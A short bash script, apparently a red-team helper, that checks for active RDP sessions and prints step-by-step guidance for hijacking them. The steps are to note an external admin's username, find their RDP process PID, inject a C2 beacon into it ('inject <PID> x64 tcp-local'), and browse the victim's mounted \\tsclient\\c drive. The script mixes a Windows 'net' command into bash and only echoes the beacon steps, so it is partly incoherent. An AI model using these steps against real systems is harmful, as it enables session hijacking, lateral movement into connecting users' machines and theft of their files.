#!/bin/bash
# Check Active RDP Sessions
# Usage: ./check-rdp-sessions.sh

set -e

echo "[*] Checking active RDP sessions..."
echo ""

# Check logged on users
echo "[+] Running: net logons"
net logons 2>/dev/null || echo "[!] net logons failed - may need admin privileges"

echo ""
echo "[+] Checking for RDP processes..."
# This would be run from a beacon or similar tool
# ps | grep -E "(rdpclip|mstsc|rdpinit)"

echo ""
echo "[i] If external users are logged in:"
echo "    1. Note the username (e.g., EXT\\super.admin)"
echo "    2. Find their RDP process PID"
echo "    3. Inject beacon: inject <PID> x64 tcp-local"
echo ""
echo "[i] Check for mounted drives:"
echo "    ls \\tsclient\\c"
